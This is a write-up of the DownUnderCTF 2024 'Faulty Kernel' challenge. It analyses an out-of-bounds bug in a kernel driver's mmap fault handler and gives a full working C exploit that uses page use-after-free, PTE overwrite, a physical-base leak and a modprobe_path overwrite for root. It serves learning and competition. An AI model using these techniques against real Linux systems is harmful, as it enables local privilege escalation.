---
title: "[CTF] DownUnderCTF 2024 - Faulty Kernel - Write Up"
date: 2024-07-26 13:00:00 +0900
categories: [CTF, DownUnder]
tags: [ctf, write-up]
---

## 0x00 Overview
Faulty Kernel is a problem presented in DownUnder CTF 2024. This challenge involves exploiting a vulnerability in the mmap fault handler using techniques such as Cross Cache and dirty pipe. Therefore, this problem provides an opportunity to learn about kernel exploit techniques that occur in the real world.

## 0x01 Analysis
This challenge provides the source code of the device driver, allowing us to easily identify the vulnerability.

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/mm.h>
#include <linux/string.h>

#define DEV_NAME "challenge"
#define FAIL (-1)
#define SUCCESS (0)

#define PAGECOUNT (128)

MODULE_AUTHOR("toasterpwn");
MODULE_DESCRIPTION("pwn me :)");
MODULE_LICENSE("GPL");

struct shared_buffer {
	pgoff_t pagecount;
	struct page** pages;
};

static struct miscdevice dev;

static int dev_mmap(struct file* filp, struct vm_area_struct* vma);
static vm_fault_t dev_vma_fault(struct vm_fault *vmf);
static int dev_open(struct inode* inodep, struct file* filp);

static struct file_operations dev_fops = {
	.owner = THIS_MODULE,
	.open = dev_open,
	.mmap = dev_mmap
};

static struct vm_operations_struct dev_vm_ops = {
	.fault = dev_vma_fault
};

static int dev_mmap(struct file* filp, struct vm_area_struct* vma) {
	struct shared_buffer* sbuf = filp->private_data;
	pgoff_t pages = vma_pages(vma);
	if (pages > sbuf->pagecount) { 
		return -EINVAL;
	}

	vma->vm_ops = &dev_vm_ops;
        vma->vm_private_data = sbuf;

	return SUCCESS;
}

static vm_fault_t dev_vma_fault(struct vm_fault *vmf) {
	struct vm_area_struct *vma = vmf->vma;
	struct shared_buffer *sbuf = vma->vm_private_data;

	pgoff_t pgoff = vmf->pgoff;

    	if (pgoff > sbuf->pagecount) {  // (1) Incomplete Validation
        	return VM_FAULT_SIGBUS;
    	}

	get_page(sbuf->pages[pgoff]);   // (2) OOB
	vmf->page = sbuf->pages[pgoff];

	return SUCCESS;
}

static int dev_open(struct inode* inodep, struct file* filp) { 
	int i;
	struct shared_buffer* sbuf;

	sbuf = kzalloc(sizeof(*sbuf), GFP_KERNEL);
	if (!sbuf) {
		printk(KERN_INFO "[dev] Failed to initilise buffer.\n");
		goto fail;
	}

	sbuf->pagecount = PAGECOUNT;    // PAGECOUNT = 128
	sbuf->pages = kmalloc_array(sbuf->pagecount, sizeof(*sbuf->pages), GFP_KERNEL); // sbuf->pagecount * sizeof(*sbuf->pages) == 0x1024
	if (!sbuf->pages) {
		printk(KERN_INFO "[dev] Failed to initilise buffer.\n");
		goto fail_alloc_buf;
	}

	for (i = 0; i < sbuf->pagecount; i++) {
		sbuf->pages[i] = alloc_page(GFP_KERNEL); // GFP_KERNEL == 0xcc0
		if (!sbuf->pages[i]) {
			printk(KERN_ERR "[dev] Failed to allocate page %d.\n", i);
			goto fail_alloc_pages;
		}
	}

	filp->private_data = sbuf;
	return SUCCESS;

fail_alloc_pages:
	while (i--) {
		if (sbuf->pages[i]) {
			__free_page(sbuf->pages[i]);
		}
	}

	kfree(sbuf->pages);
fail_alloc_buf:
	kfree(sbuf);
fail:
	return FAIL;
}

static int dev_init(void) {
	dev.minor = MISC_DYNAMIC_MINOR;
    	dev.name = DEV_NAME;
    	dev.fops = &dev_fops;
    	dev.mode = 0644;

	if (misc_register(&dev)) {
        	return FAIL;
    	}


	printk(KERN_INFO "[dev] It's mappin' time!\n");
	
	return SUCCESS;
}

static void dev_cleanup(void) {
	misc_deregister(&dev);

	printk(KERN_INFO "[dev] Shutting down.\n");
}


module_init(dev_init);
module_exit(dev_cleanup);
```

This driver only implements the `dev_open` and `dev_mmap` functions. Additionally, there is a fault handler that is called when a page fault occurs on a page allocated with mmap. During the opening of the driver listed above, dev_open is called, which simply allocates a buffer according to the shared_buffer structure and stores a pointer in the private_data field. It does not appear possible to maliciously call __free_alloc in this function. When the mmap function of this device driver is called, it performs a simple validation check and then maps the pages of the shared_buffer to the user address space. If a page fault occurs in the user address space allocated by mmap, the `dev_vma_fault` function is called and allocates the page. However, if the **mremap** function is used to extend the VMA and a page fault is triggered in a specific virtual memory area, due to insufficient validation at point (1) in the dev_vma_fault function, an OOB is triggered at point (2).

### CONFIG_SLAB_FREELIST_RANDOM 
In 'dev_open', a kmalloc-1024 slab cache is allocated to sbuf->pages, so it is common to create holes in this kmalloc-1k using a pipe spray to trigger an OOB. However, in this challenge, `CONFIG_SLAB_FREELIST_RANDOM` is disabled, and the kmalloc-1k is relatively quiet compared to other caches, so you can allocate slabs consecutively without using a pipe spray.

> **What is Pipe Spray?** <br> The pipe_buffer structure uses the kmalloc-1024 cache, so allocating many of these and freeing some to create holes in between is an exploit technique that utilizes the page of the next slab object. This technique is effective when freelist randomization is enabled. <br>
![Desktop View](/posts/20240726/pipe_spray.png)_Status of the kmalloc-1024 slab cache_
{: .prompt-tip }

### Page UAF
For the above reasons, you can create only one pipe, place the pipe_buffer right after sbuf->pages allocated in the kmalloc-1024 cache, and create a dangling pointer such that the page of the pipe_buffer points to the PTE. Then, by triggering an OOB in the mmap fault handler, you can manipulate the PTE.

```c
struct pipe_buffer {
  struct page * page;
  unsigned int offset;
  unsigned int len;
  const struct pipe_buf_operations * ops;
  unsigned int flags;
  unsigned long private;
};  
```

The way pipe_buffer's page references the PTE is as follows:

One of the members of pipe_buffer, page, is allocated with GFP flags 0x500cc2 through `pipe_write->alloc_pages`. This results in a page of the unmovable type because the movable and reclaimable bits are not set. Consequently, when this page is freed, it goes into the unmovable freelist.

When a page fault occurs on an anonymous page, a page is allocated with GFP flags 0x100cca through the chain of functions: `shmem_fault -> shmem_get_folio_gfp -> shmem_alloc_folio -> alloc_pages_mpol`. This results in the allocation of a movable page.

As a result, if many anonymous pages experience page faults, PTEs are created and unmovable pages are allocated. At this point, when the pipe_buffer is freed and the unmovable page is allocated, an OOB can be triggered, allowing manipulation of the PTE.

In this challenge, since there is only one CPU, there is no need to worry about pcpu pagesets.

Check the GFP flags below:
```c
enum {
    ___GFP_DMA_BIT,
    ___GFP_HIGHMEM_BIT,
    ___GFP_DMA32_BIT,
    ___GFP_MOVABLE_BIT,
    ___GFP_RECLAIMABLE_BIT,
    ___GFP_HIGH_BIT,
    ___GFP_IO_BIT,
    ___GFP_FS_BIT,
    ___GFP_ZERO_BIT,
    ___GFP_UNUSED_BIT,    /* 0x200u unused */
    ___GFP_DIRECT_RECLAIM_BIT,
    ___GFP_KSWAPD_RECLAIM_BIT,
    ___GFP_WRITE_BIT,
    ___GFP_NOWARN_BIT,
    ___GFP_RETRY_MAYFAIL_BIT,
    ___GFP_NOFAIL_BIT,
    ___GFP_NORETRY_BIT,
    ___GFP_MEMALLOC_BIT,
    ___GFP_COMP_BIT,
    ___GFP_NOMEMALLOC_BIT,
    ___GFP_HARDWALL_BIT,
    ___GFP_THISNODE_BIT,
    ___GFP_ACCOUNT_BIT,
    ___GFP_ZEROTAGS_BIT,
#ifdef CONFIG_KASAN_HW_TAGS
    ___GFP_SKIP_ZERO_BIT,
    ___GFP_SKIP_KASAN_BIT,
#endif
#ifdef CONFIG_LOCKDEP
    ___GFP_NOLOCKDEP_BIT,
#endif
#ifdef CONFIG_SLAB_OBJ_EXT
    ___GFP_NO_OBJ_EXT_BIT,
#endif
    ___GFP_LAST_BIT
};
```

> An exploit technique that is often used involves using the **vmsplice** function on a pipe to copy pages from a file object, such as /etc/passwd, and then modifying the file contents. <br> For more details, please refer to [[2]](#ref).
{: .prompt-tip }

### Leaking Physical base address
By modifying the PTE, we can read and modify the values of the desired physical memory. Therefore, we need to know the value of the physical address. On both Linux and Windows, you can find fixed physical addresses as shown in the image below.

![Desktop View](/posts/20240726/fixed_physical_address.png)_Fixed physical address range_

The pages around here are always fixed, and it appears that the data in the page table remains intact. Therefore, you can leak and effectively use the kernel-land physical address located at the 0x9c000 offset.

![Desktop View](/posts/20240726/iomem.png)_Physical base memory of the kernel data section_

We can exploit by modifying modprobe or cred after determining the physical base address.
Since SMEP and SMAP are enabled, we need to use the modprobe technique. The modprobe_path exists in the kernel data section, so you can read **/proc/iomem** to find the physical memory base address of the kernel data section. By using the leaked physical address and offset, you can determine the physical base address.

## 0x02 Exploit
After that, you can proceed with the exploit using a standard modprobe_path overwrite technique.

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <err.h>

typedef unsigned long ulong;

#define SPRAY_CNT 0x200
#define PAGE_SIZE 0x1000
#define PAGE_CNT 128
#define SBUF_SIZE (PAGE_CNT * PAGE_SIZE)

char *spray[SPRAY_CNT];

void get_flag(void)
{
    system("echo '#!/bin/sh\nchmod 777 /flag.txt' > /tmp/ex");
    system("chmod +x /tmp/ex");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    system("/tmp/dummy");

    system("cat /flag.txt");
}

int page()
{
	int pfd[2];
	pipe(pfd);
	write(pfd[1], "BBBBBBBB", 8);
	close(pfd[0]);
	close(pfd[1]);
	return 0;
}

int main(int argc, char **argv)
{
	for (int i = 0; i < SPRAY_CNT; i++){
		spray[i] = mmap((void*)(0xdead000000 + i*0x10000), 0x8000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_SHARED, -1, 0);
	}
		
	int fd = open("/dev/challenge", O_RDWR)	;
	char *p = mmap((char*)0xcafe0000, SBUF_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_FIXED, fd, 0);
	mremap(p, SBUF_SIZE, PAGE_SIZE*129, 0);

	pid_t pid = clone(page, malloc(0x1000)+0x1000, SIGCHLD, 0);
	waitpid(pid, 0, 0);

	sleep(1);

	for (int i = 0; i < SPRAY_CNT; i++){
		for (int j = 0; j < 8; j++){
				*(ulong*)(spray[i] + j*PAGE_SIZE) = 0x4141414141414141;
		}
	}

	ulong *pte = (ulong*)(p+SBUF_SIZE);

	if (*(char*)pte != 0x67) {
		errx(1, "[-] Error");
		return 1;
	}

	*pte = 0x800000000009c067;
	ulong *vuln = 0;
	for (int i = 0; i < SPRAY_CNT; i ++) {
		for (int j = 0; j < 8; j++) {
			if (*(ulong*)(spray[i]+j*0x1000) != 0x4141414141414141) {
				vuln = (ulong*)(spray[i] + j * 0x1000);
				break;
			}
		}
		if (vuln){
			break;
		}
	}

	ulong pb = (*vuln & ~0xfff) - 0x2604000;
	printf("[+] phys_base = 0x%lx\n", pb);

	ulong modprobe = pb + 0x1b3f200;
	*pte = 0x8000000000000067 + (modprobe & ~0xfff);
	printf("0x%lx", *pte);
	puts("[+] Overwrite Kernel Function");
	vuln[0x20] = 0x78652f706d742f;

	get_flag();

	return 0;
}
```

## Ref
[1] <https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary> <br>
[2] <https://labs.bluefrostsecurity.de/blog/cve-2023-2008.html> <br>
[3] <https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#Leaking-physical-base-address> <br>